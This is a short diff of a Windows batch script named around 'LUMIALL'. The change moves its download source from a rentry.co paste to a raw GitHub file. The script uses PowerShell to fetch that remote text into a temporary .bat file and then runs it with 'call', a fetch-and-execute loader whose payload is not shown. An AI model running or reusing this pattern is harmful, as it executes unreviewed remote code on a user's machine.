@@ -5,7 +5,7 @@ set "embeddedScript=temp_script_LUMIALL.bat"
 
 :GetLUMIALLRun
 :: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/LUMIALL/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/LumiAll') | Out-File -Encoding ASCII '%embeddedScript%'"
 
 if exist "%embeddedScript%" (
     call "%embeddedScript%"
